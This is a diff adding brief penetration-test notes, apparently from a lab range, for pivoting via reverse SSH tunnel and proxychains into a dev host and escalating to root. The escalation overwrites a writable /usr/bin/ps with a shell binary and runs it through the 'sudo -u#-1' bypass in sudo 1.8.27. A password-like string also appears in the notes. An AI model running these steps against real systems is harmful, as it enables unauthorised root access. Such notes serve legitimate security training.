@@ -1,0 +1,16 @@
+Get to l.strauss@devbox.artstailor.com the usual way
+    * sudo service ssh start
+    * rdesktop -g 90% innerouter.artstailor.com > pr0b3 H4ckB4ckJ4ck
+    * ssh -R 1081 kali@172.24.0.10
+    * proxychains ssh l.strauss@devbox.artstailor.com
+Exploration:
+    * Look around and see sudo -V is 1.8.27 which means we can use the 
+    sudo -u#-1 [command] vulnerability
+    * sudo -l reveals we can try and manipulate the ps command
+    * getfacl /usr/bin/ps reveals we have write access
+    * playing with ps.special reveals this is initiates a bash shell
+    * can use sudo and this ps.special to possibly create a root shell
+    * overwrite /usr/bin/ps with ~/bins/ps.special
+        cat ~/bins/ps.special > /usr/bin/ps
+    * put it all together 
+        sudo -u#-1 ps
